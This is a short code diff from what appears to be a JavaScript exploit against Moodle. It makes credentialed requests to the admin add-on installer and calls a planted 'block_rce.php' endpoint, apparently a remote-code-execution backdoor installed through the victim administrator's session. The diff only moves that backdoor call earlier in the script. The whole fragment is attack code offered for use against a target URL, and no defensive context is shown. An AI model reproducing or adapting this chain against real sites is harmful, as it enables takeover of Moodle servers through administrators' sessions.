@@ -1,4 +1,5 @@
   const URL = "https://daviddoaa.me/moodle/"; // Change this to your target URL 
+  fetch(URL + "blocks/rce/lang/en/block_rce.php?token=mail");
   fetch(URL + "admin/tool/installaddon/index.php", {
     credentials: "include",
   })
@@ -98,9 +99,7 @@
                       credentials: "include",
                     }
                   ).then(() => {
-                    fetch(
-                      URL + "blocks/rce/lang/en/block_rce.php?token=mail"
-                    );
+                    
                   });
                 });
             });
